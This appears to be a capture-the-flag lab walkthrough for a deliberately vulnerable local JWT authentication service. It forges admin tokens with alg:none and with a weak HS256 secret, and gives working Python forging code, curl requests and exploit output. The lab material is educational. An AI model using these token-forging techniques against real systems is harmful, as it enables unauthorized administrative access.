# Walkthrough: JWT Security

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8081/
```

Output:
```json
{
  "service": "AuthApp v1.0",
  "endpoints": [
    "POST /login  {\"username\": \"...\", \"password\": \"...\"} -> token",
    "GET  /admin  Authorization: Bearer <token>          -> flag"
  ]
}
```

## Step 1: Log In and Inspect the Token

```bash
curl -s -X POST http://localhost:8081/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password"}'
```

Output:
```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.XXX"}
```

Decode the header and payload:

```python
import base64, json

def b64d(s):
    pad = 4 - len(s) % 4
    return json.loads(base64.urlsafe_b64decode(s + "=" * (pad % 4)))

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.XXX"
parts = token.split(".")
print(b64d(parts[0]))  # {"alg": "HS256", "typ": "JWT"}
print(b64d(parts[1]))  # {"username": "user", "role": "user"}
```

The payload field is `username`. The admin endpoint checks this field.

## Step 2: Confirm the User Is Blocked

```bash
TOKEN=<token from above>
curl -s http://localhost:8081/admin -H "Authorization: Bearer $TOKEN"
```

Output:
```json
{"error": "admin only"}
```

## Step 3: Forge an Admin Token with alg:none

```python
import base64, json

def b64u(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

h = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
p = b64u(json.dumps({"username": "admin", "role": "admin"}).encode())
print(f"{h}.{p}.")
```

Submit:

```bash
curl -s http://localhost:8081/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
```

Output:
```json
{
  "message": "Welcome, admin.",
  "flag": "POC{...}"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8081
```

Output:
```
[*] Target: http://localhost:8081
[*] Got user token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[*] /admin with user token: 403 (expected 403)

[*] Forged alg:none token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...

[+] Response: Welcome, admin.
[+] Flag: POC{...}
```

## Bonus: Forge via Weak Secret

The signing key is `secret123`. Sign a new admin payload directly:

```python
import base64, hashlib, hmac, json

SECRET = "secret123"

def b64u(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64u(json.dumps({"username": "admin", "role": "admin"}).encode())
sig = hmac.new(SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b64u(sig)}")
```

Submit that token to `/admin` to get the same flag.
